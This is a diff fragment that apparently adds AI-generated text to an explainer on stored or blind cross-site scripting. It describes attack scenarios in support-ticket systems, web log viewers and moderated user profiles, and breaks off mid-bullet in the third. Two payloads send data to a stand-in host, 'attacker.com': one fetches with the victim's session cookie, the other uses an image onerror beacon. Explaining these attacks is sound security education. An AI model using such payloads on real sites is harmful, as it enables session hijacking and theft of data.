@@ -120,4 +120,28 @@ Continue From Real-World Examples and and append dont write from the start
 
 ### **1. Ticket Support Systems (Zendesk, Freshdesk)**
 - **Scenario**: An attacker submits a malicious ticket with a JavaScript payload in the "description" field.
-- **Execution**: When a support agent views the ticket in the admin panel, the payload executes,
+- **Execution**: When a support agent views the ticket in the admin panel, the payload executes, stealing their session cookie.
+- **Impact**: Attacker gains unauthorized access to the support system and potentially customer data.
+
+**Payload Used**:
+```html
+<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
+```
+
+---
+
+### **2. Web Application Logs (Apache/Nginx)**
+- **Scenario**: An attacker injects a payload into HTTP headers (e.g., `User-Agent` or `Referer`).
+- **Execution**: The payload is stored in server logs. When an admin reviews logs via a web interface, the script triggers.
+- **Impact**: Sensitive server/application data is exfiltrated.
+
+**Payload Used**:
+```javascript
+<img src=x onerror="navigator.sendBeacon('https://attacker.com/log', window.location.href)">
+```
+
+---
+
+### **3. User Profiles with Admin Moderation**
+- **Scenario**: A social media platform allows users to embed HTML in bios, which admins review before approval.
+- **
